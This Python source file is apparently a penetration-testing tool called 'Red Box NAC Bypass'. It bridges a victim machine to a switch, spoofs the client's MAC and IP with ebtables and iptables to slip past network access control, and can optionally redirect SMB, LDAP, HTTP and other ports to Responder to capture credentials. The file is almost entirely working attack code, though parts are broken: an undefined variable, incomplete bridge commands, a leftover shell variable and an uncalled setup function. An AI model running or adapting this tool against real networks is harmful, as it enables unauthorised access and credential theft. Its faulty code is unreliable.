import click
import subprocess
import inspect
import shutil
import os
import sys
import yaml
import pathlib
import uuid
import rstr
import socket
import netifaces
import base64
from scapy.all import *

bridge_interface = "br0"
bridge_ip = "169.254.66.66"
bridge_gateway = "169.254.66.1"

tmp_dump_file = "/var/tmp/dump.pcap"

arptables_command = "/usr/sbin/arptables"
ebtables_command = "/usr/sbin/ebtables"
iptables_command = "/usr/sbin/iptables"

responder_ports = [137,138,53,389,1433,1434,80,443,445,139,21,25,587,110,143,3128,5553]

port_range = "61000-62000"

client_traffic_filter = "tcp"

class out():
    line_symbol = ""
    module = "nac-bypass"
    def error(text,module=module,line_symbol="[-]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='red',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def warning(text,module=module,line_symbol="[!]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='yellow',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def info(text,module=module,line_symbol="[*]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='blue',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def success(text,module=module,line_symbol="[+]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='green',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def debug(text,module=module,line_symbol="[DEBUG]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='cyan',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

def execute_command(command, silent=True):
    if silent:
        subprocess.run(command,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    else:
        subprocess.run(command,shell=True)

def write_file(file_path, content, backup=True):
    if backup and os.path.exists(file_path):
        shutil.copy(file_path,f"{file_path}.orig")
    
    with open(file_path,"w") as file_to_write:
            file_to_write.write(content)

def delete_file(file_path):
    os.remove(file_path)

def restore_file(file_path):
    backup_path = f"{file_path}.orig"
    if os.path.exists(backup_path):
        shutil.copy(backup_path,file_path)

def remove_configuration():
    execute_command(f"ifconfig {bridge_interface} down")
    execute_command(f"brctl delbr {bridge_interface}")
    
    execute_command(f"arp -d -i {bridge_interface} {bridge_gateway} {gateway_mac}")
    execute_command(f"route del default")

    execute_command(f"{ebtables_command} -F")
    execute_command(f"{ebtables_command} -F -t nat")
    execute_command(f"{arptables_command} -F")
    execute_command(f"{iptables_command} -F")
    execute_command(f"{iptables_command} -F -t nat")

    restore_file("/etc/sysctl.conf")
    restore_file("/etc/resolv.conf")

    out.success("Removed NAC bypass configuration!")


    
def initial_setup(switch_interface,client_interface):
    switch_interface_mac = netifaces.ifaddresses(switch_interface)[netifaces.AF_LINK][0]["addr"]
    client_interface_mac = netifaces.ifaddresses(client_interface)[netifaces.AF_LINK][0]["addr"]

    write_file("/etc/sysctl.conf","net.ipv6.conf.all.disable_ipv6 = 1")
    execute_command("sysctl -p")
    write_file("/etc/resolv.conf","")
    execute_command("systemctl stop ntp")
    execute_command("timedatectl set-ntp false")
    
    out.info("Starting bridge configuration!")

    execute_command(f"brctl addbr {bridge_interface}")
    execute_command(f"brctl addif {client_interface}")
    execute_command(f"brctl addif {switch_interface}")

    write_file("/sys/class/net/br0/bridge/group_fwd_mask","8")
    write_file("/proc/sys/net/bridge/bridge-nf-call-iptables","1")

    execute_command(f"ifconfig {client_interface} 0.0.0.0 up promisc")
    execute_command(f"ifconfig {switch_interface} 0.0.0.0 up promisc")

    execute_command(f"macchanger -m 00:12:34:56:78:90 {bridge_interface}")
    execute_command(f"macchanger -m {switch_interface_mac} {bridge_interface}")

    execute_command(f"ifconfig {bridge_interface} 0.0.0.0 up promisc")

    out.info("Bridge up and running!")
    out.info("Connect Ethernet cables to adatapers...")
    out.info("The client machine should have a network connection at this point!")

def check_interfaces(switch_interface,client_interface):
    print("TODO")

def connection_setup(switch_interface,client_interface,responder):
    switch_interface_mac = netifaces.ifaddresses(switch_interface)[netifaces.AF_LINK][0]["addr"]
    client_interface_mac = netifaces.ifaddresses(client_interface)[netifaces.AF_LINK][0]["addr"]

    execute_command(f"mii-tool -r {client_interface}")
    execute_command(f"mii-tool -r {switch_interface}")

    out.info("Sniffing for traffic to get client and gateway MAC addresses.")
    client_traffic_capture = sniff(iface=client_interface,filter=client_traffic_filter, count=1)
    client_mac = client_traffic_capture[0][Ether].src
    client_ip = client_traffic_capture[0][IP].src
    gateway_mac = client_traffic_capture[0][Ether].dst

    execute_command(f"{arptables_command} -A OUTPUT -i {client_interface} -j DROP")
    execute_command(f"{arptables_command} -A OUTPUT -i {switch_interface} -j DROP")
    execute_command(f"{iptables_command} -A OUTPUT -i {client_interface} -j DROP")
    execute_command(f"{iptables_command} -A OUTPUT -i {switch_interface} -j DROP")

    execute_command(f"ifconfig {bridge_interface} {bridge_ip} up promisc")

    execute_command(f"{ebtables_command} -t nat -A POSTROUTING -s {switch_interface_mac} -o {switch_interface} -j snat --to-src {client_mac}")
    execute_command(f"{ebtables_command} -t nat -A POSTROUTING -s {switch_interface_mac} -o {bridge_interface} -j snat --to-src {client_mac}")

    execute_command(f"arp -s -i {bridge_interface} {bridge_gateway} {gateway_mac}")
    execute_command(f"route add default gw $BRGW")

    if responder:
        for port in responder_ports:
            execute_command(f"{iptables_command} -t nat -A PREROUTING -i br0 -d {client_ip} -p tcp --dport {port} -j DNAT --to {bridge_ip}:{port}")
            execute_command(f"{iptables_command} -t nat -A PREROUTING -i br0 -d {client_ip} -p udp --dport {port} -j DNAT --to {bridge_ip}:{port}")

    execute_command(f"{iptables_command} -t nat -A POSTROUTING -o {bridge_interface} -s {bridge_ip} -p tcp -j SNAT --to {client_ip}:{port_range}")
    execute_command(f"{iptables_command} -t nat -A POSTROUTING -o {bridge_interface} -s {bridge_ip} -p udp -j SNAT --to {client_ip}:{port_range}")
    execute_command(f"{iptables_command} -t nat -A POSTROUTING -o {bridge_interface} -s {bridge_ip} -p icmp -j SNAT --to {client_ip}")

    execute_command(f"{arptables_command} -D OUTPUT -i {client_interface} -j DROP")
    execute_command(f"{arptables_command} -D OUTPUT -i {switch_interface} -j DROP")
    execute_command(f"{iptables_command} -D OUTPUT -i {client_interface} -j DROP")
    execute_command(f"{iptables_command} -D OUTPUT -i {switch_interface} -j DROP")

    out.info("Connection setup complete!")

@click.command()
@click.option('--switch-interface', help='Name of the ETHERNET interface facing the switch',type=str,required=True)
@click.option('--client-interface', help='Name of the ETHERNET interface facing the client',type=str,required=True)
@click.option('--responder', help='Enable port redirection for Responder',is_flag=True,default=False)
@click.option('--remove', help='Removes all the settings of the NAC bypass',is_flag=True,default=False)

def cli(switch_interface,client_interface,responder,remove):
    """\b
Red Box NAC Bypass"""

    if os.geteuid() != 0:
        out.error("Root permissions required!")
        quit(1)

    available_interfaces = netifaces.interfaces()
    if switch_interface not in available_interfaces or client_interface not in available_interfaces:
        out.error("Please provide a valid interface names!")
        out.info("Available interfaces:")
        for available_interface in available_interfaces:
            out.info(f"\t{available_interface}",line_symbol="►")
        quit(1)


    initial_setup(switch_interface,client_interface)
    


if __name__ == "__main__":
    cli()
